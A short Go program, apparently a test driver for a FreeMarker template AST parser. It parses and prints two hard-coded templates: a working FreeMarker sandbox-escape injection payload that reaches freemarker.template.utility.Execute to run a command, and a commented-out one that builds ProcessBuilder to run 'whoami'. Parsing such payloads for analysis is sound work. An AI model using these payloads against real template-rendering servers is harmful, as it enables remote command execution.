package main

import (
	"fmt"
	"os"

	"github.com/weaweawe01/freemarker-ast/internal/astdump"
)

func main() {
	src := `<#assign classLoader=object?api.class.protectionDomain.classLoader>
	<#assign clazz=classLoader.loadClass("ClassExposingGSON")>
	<#assign field=clazz?api.getField("GSON")>
	<#assign gson=field?api.get(null)>
	<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))>
	${ex("open -a Calculator.app")};`

	// src := `<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","whoami").start()}`
	out, err := astdump.ParseToJavaLikeAST(src)
	if err != nil {
		fmt.Fprintf(os.Stderr, "parse error: %v\n", err)
		os.Exit(1)
	}

	fmt.Print(out)

}
